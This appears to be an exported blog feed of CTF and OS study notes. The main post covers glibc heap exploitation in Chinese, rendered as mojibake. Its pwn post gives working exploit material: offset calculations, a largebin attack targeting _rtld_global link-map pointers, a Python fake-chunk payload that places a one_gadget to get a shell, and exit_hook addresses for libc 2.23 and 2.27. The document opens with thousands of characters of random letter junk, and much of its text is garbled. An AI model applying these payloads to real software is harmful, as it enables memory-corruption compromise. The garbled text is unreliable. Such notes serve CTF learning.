kwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegrfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjas</span><br><span class="line"></span><br><span class="line">dnjwfhrifhiuwhcieghtughhijyiohtonyjkpuopjlpmkyojknohnmotimjoqerwsreqczdxdswdrqzfgscxfqwdeqtwfewyjhfbvkrjnhioytjkuopjkplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhlnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhritunkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplngnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcgghnkhnrnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhplnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyegiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkrhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhclnghnhclnghnkhnrnkhuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgtwyerqugiidhcghnghnkhnrituhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhccxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhc</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤ä¸è¾“å‡ºç»“æœ <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å•çº¿ç¨‹</span></span><br><span class="line">time ./a.out</span><br><span class="line">1419</span><br><span class="line"></span><br><span class="line">real    0m8.628s</span><br><span class="line">user    0m0.038s</span><br><span class="line">sys     0m0.039s</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time ./plcs-64</span><br><span class="line">1419</span><br><span class="line">real    0m17.036s</span><br><span class="line">user    0m1.344s</span><br><span class="line">sys     0m0.846s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 2</span><br><span class="line">1419</span><br><span class="line">real    0m14.251s</span><br><span class="line">user    0m1.044s</span><br><span class="line">sys     0m1.093s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 4</span><br><span class="line">1419</span><br><span class="line">real    0m8.603s</span><br><span class="line">user    0m0.842s</span><br><span class="line">sys     0m2.181s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 8</span><br><span class="line">1419</span><br><span class="line">real    0m6.961s</span><br><span class="line">user    0m1.117s</span><br><span class="line">sys     0m4.643s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 16</span><br><span class="line">1418</span><br><span class="line">real    0m6.554s</span><br><span class="line">user    0m1.299s</span><br><span class="line">sys     0m5.947s</span><br></pre></td></tr></table></figure>
<h1 id="lecture-16">Lecture 16</h1>
<ol type="1">
<li><p>ç»å¸¸åæ€è‡ªå·±åšçš„äº‹æƒ…å¥½ä¸å¥½ã€‚jyyè€å¸ˆç»™å‡ºçš„ä¾‹å­æ˜¯â€œç”¨cmdæ›¿ä»£webpageçš„gptï¼Œä½¿å¯¹è¯æ›´ç¨³å®šæ›´æ˜“ä¿å­˜â€</p></li>
<li><p>è®¡ç®—æœºçš„ä¸–ç•Œé‡Œæ²¡æœ‰ä»€ä¹ˆæ˜¯æˆ‘ä»¬æä¸å®šçš„ï¼Œå…ˆä»ç®€å•çš„å…¥æ‰‹ï¼Œäº†è§£åŸç†ä¹‹åå†å»æ¥è§¦å¤æ‚çš„ï¼ˆä¸¾ä¾‹æ˜¯
pmap æ˜¯è¯»å– maps å®ç°çš„ï¼‰</p></li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - IO_File and ld.so exploit summary</title>
    <url>/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
IO_File ä¸ ld.so åˆ©ç”¨æ€»ç»“
</blockquote>
<span id="more"></span>
<h1 id="io_file">[1] IO_File</h1>
<p><a href="https://www.cnblogs.com/hawkJW/p/13546416.html">å¥½æ–‡</a></p>
<p><a
href="https://mp.weixin.qq.com/s/OjMQjjI2ESfmZ5wwFbNhRQ">PIG-007</a></p>
<p><a href="https://bbs.kanxue.com/thread-276044.htm">glibc2.37
IO</a></p>
<h1 id="ld.so">[2] ld.so</h1>
<h2 id="rtld_global._dl_ns._ns_loaded">[2-1]
_rtld_global._dl_ns._ns_loaded</h2>
<h3 id="åŸç†">[2-1-1] åŸç†</h3>
<p>ç¨‹åºåœ¨è°ƒç”¨<code>exit()</code>é€€å‡ºæ—¶ï¼Œä¼šè°ƒç”¨<code>(å¾…è°ƒè¯•)</code>ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code></p>
<h3 id="æ‰¾åç§»é‡">[2-1-2] æ‰¾åç§»é‡</h3>
<blockquote>
<p>æ¢å¤è°ƒè¯•ç¬¦å·è¯·çœ‹<a
href="https://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/#more">Pwn
- Heap Exploit Summary</a> çš„ patchelf éƒ¨åˆ†</p>
</blockquote>
<p>æ¢å¤è°ƒè¯•ç¬¦å·ä»¥åï¼Œåœ¨ pwndbg ä¸­è¾“å…¥ <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰¾ &amp;(_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next) </span></span><br><span class="line"><span class="comment"># ä¸ &amp;(_rtld_global) ä¹‹é—´çš„åç§»é‡</span></span><br><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">0x7f992b424040-&gt;0x7f992b3f3018 is -0x31028 bytes (-0x6205 words)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰¾ _rtld_global çš„çœŸå®åœ°å€</span></span><br><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line"><span class="variable">$1</span> = (struct rtld_global *) 0x7f8bb8255040 &lt;_rtld_global&gt;</span><br><span class="line"><span class="comment"># è‹¥æœ¬æ¬¡è¿è¡Œçš„ libc_base ä¸º 0x7f8bb803a000</span></span><br><span class="line"><span class="comment"># åˆ™ offset = 0x7f8bb8255040 - 0x7f8bb803a000 = 0x21b040</span></span><br><span class="line"><span class="comment"># è¿™ä¸ª offset ä¼šåœ¨ä¸‹é¢çš„ python ä»£ç ä¸­ç”¨åˆ°</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®— _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next çš„çœŸå®åœ°å€</span></span><br><span class="line">rtld_global = libc_base + offset</span><br><span class="line">rtld_next_next_next = rtld_global -<span class="number">0x31028</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack ä¸­</span></span><br><span class="line">target_addr = rtld_next_next_next</span><br><span class="line"><span class="comment"># ä¿®æ”¹ chunk.bk_nextsize æ—¶</span></span><br><span class="line">chunk.bk_nextsize = rtld_next_next_next - <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
<p>largebin attack ä»¥åï¼Œè§‚å¯Ÿ _rtld_globalï¼Œåº”è¯¥æœ‰è¿™æ ·ä¸€æ¡é“¾
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_rtld_global._dl_ns._ns_loaded        = 0x7f... head_node</span><br><span class="line">              |</span><br><span class="line">              |  (*_ns_loaded) + 0x18</span><br><span class="line">              v</span><br><span class="line">_rtld_global._dl_ns._ns_loaded.l_next = 0x7f... node_1</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx.l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">..._ns_loaded.l_next-&gt;l_next          = 0x7f... node_2</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx-&gt;l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">...l_next-&gt;l_next-&gt;l_next             = 0x55...(å †åœ°å€) node_3</span><br><span class="line"># é“¾ä¸Šæ­£å¥½å››ä¸ª node</span><br></pre></td></tr></table></figure></p>
<h3 id="æ„é€ -fake-chunk">[2-1-3] æ„é€  fake chunk</h3>
<p>æˆ‘ä»¬å‡è®¾ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                    |-----------|-----------|</span><br><span class="line">fake_rtld_global -&gt; | perv_size |    size   |</span><br><span class="line">                    |-----------|-----------|</span><br><span class="line">                    |       user_data       |</span><br><span class="line">                    |         . . .         |</span><br><span class="line">                    |-----------|-----------|</span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æˆ‘çœ‹çš„ wp å¤§å¤šæ•°éƒ½åœ¨æ„é€  fake chunk æ—¶ç”¨åˆ°äº† libc + ä¸€ä¸ªåç§»é‡,</span></span><br><span class="line"><span class="comment"># ä½†æˆ‘è¿™æ ·æ„é€ ä¹Ÿèƒ½ getshell,</span></span><br><span class="line"><span class="comment"># ä»¥ä¸‹å°±åªéœ€è¦ä¿®æ”¹ heap_base å’Œ offset å°±è¡Œ,</span></span><br><span class="line"><span class="comment"># å¯¹ libc çš„è¦æ±‚å°äº†å¾ˆå¤š.</span></span><br><span class="line">heap_base = å †çš„åŸºåœ°å€</span><br><span class="line">offset    = fake chunk çš„ prev_size åœ°å€</span><br><span class="line">fake_rtld_global = heap_base + offset</span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_rtld_global)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x58</span>) + p64(<span class="number">0x8</span>) + p64(one_gadget[<span class="number">0</span>])</span><br><span class="line">payload  = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x40</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x48</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x30c</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x1c</span>)</span><br></pre></td></tr></table></figure>
<p>æœ€åæ„é€ çš„ chunk åº”è¯¥å¦‚ä¸‹</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x5644419bbcd0 40</span><br><span class="line">00:0000â”‚  0x5644419bbcd0 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚  0x5644419bbcd8 â—‚â€” 0x521</span><br><span class="line">02:0010â”‚  0x5644419bbce0 â—‚â€” 0x0</span><br><span class="line">... â†“     2 skipped</span><br><span class="line">05:0028â”‚  0x5644419bbcf8 â€”â–¸ 0x5644419bbcd0 â—‚â€” 0x0</span><br><span class="line">06:0030â”‚  0x5644419bbd00 â—‚â€” 0x0</span><br><span class="line">... â†“     2 skipped</span><br><span class="line">09:0048â”‚  0x5644419bbd18 â€”â–¸ 0x5644419bbd28 â€”â–¸ 0x7f77ff49154c (execvpe+652) â—‚â€” mov rdx, r12</span><br><span class="line">0a:0050â”‚  0x5644419bbd20 â—‚â€” 0x8</span><br><span class="line">0b:0058â”‚  0x5644419bbd28 â€”â–¸ 0x7f77ff49154c (execvpe+652) â—‚â€” mov rdx, r12</span><br><span class="line">0c:0060â”‚  0x5644419bbd30 â—‚â€” 0x0</span><br><span class="line">... â†“     21 skipped</span><br><span class="line">22:0110â”‚  0x5644419bbde0 â€”â–¸ 0x5644419bbd10 â—‚â€” 0x0</span><br><span class="line">23:0118â”‚  0x5644419bbde8 â—‚â€” 0x0</span><br><span class="line">24:0120â”‚  0x5644419bbdf0 â€”â–¸ 0x5644419bbd18 â€”â–¸ 0x5644419bbd28 â€”â–¸ 0x7f77ff49154c (execvpe+652) â—‚â€” mov rdx, r12</span><br><span class="line">25:0128â”‚  0x5644419bbdf8 â—‚â€” 0x0</span><br><span class="line">... â†“     2 skipped</span><br></pre></td></tr></table></figure>
<h2 id="rtld_global.exit_hook">[2-2] _rtld_global.exit_hook</h2>
<blockquote>
<p>libc: 2.23 / 2.27 (å…¶ä»–ç‰ˆæœ¬æœªè®°å½•)</p>
</blockquote>
<h3 id="exit_hook-è°ƒç”¨é“¾">[2-2-1] exit_hook è°ƒç”¨é“¾</h3>
<p>exit --&gt; __run_exit_handlers --&gt; _dl_fini --&gt;
__rtld_lock_lock_recursive / __rtld_lock_unlock_recursive</p>
<h3 id="poc">[2-2-2] POC</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb ä¸­è¾“å…¥</span></span><br><span class="line">p _rtld_global # æŸ¥çœ‹ exit_hook è°ƒç”¨çš„ä¸¤ä¸ª recursive å‡½æ•°çš„åœ°å€</span><br><span class="line"></span><br><span class="line">p __rtld_lock_unlock_recursive # æŸ¥çœ‹ __rtld_lock_unlock_recursive æŒ‡å‘çš„æ•°æ®</span><br></pre></td></tr></table></figure>
<p>libc2.23 ä¸­ï¼š</p>
<p>exit_hook_addr = libc_base+0x5f0040+3848</p>
<p>exit_hook_addr = libc_base+0x5f0040+3856</p>
<p>åœ¨libc-2.27ä¸­</p>
<p>exit_hook_addr = libc_base+0x619060+3840</p>
<p>exit_hook_addr = libc_base+0x619060+3848</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - QEMUescape</title>
    <url>/2024/02/18/Pwn%20-%20QEMUescape/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æ€»ç»“ä¸€ä¸‹ QEMUescape çš„ç›¸å…³å†…å®¹ï¼Œä¾¿äºåç»­è°ƒç”¨
</blockquote>
<span id="more"></span>
<p>æˆ‘æ‰“ pwn é¢˜çš„é…ç½®æ˜¯ x86-64 | Win11 | WSL2:
kali-linuxï¼Œæ‰€ä»¥æœ¬ç¯‡å†…å®¹ä¸»è¦ä»¥æ­¤ä¸ºåŸºç¡€.</p>
<h1 id="ç›®å½•">[0] ç›®å½•</h1>
<h1 id="docker">[1] Docker</h1>
<h2 id="installation">[1-1] Installation</h2>
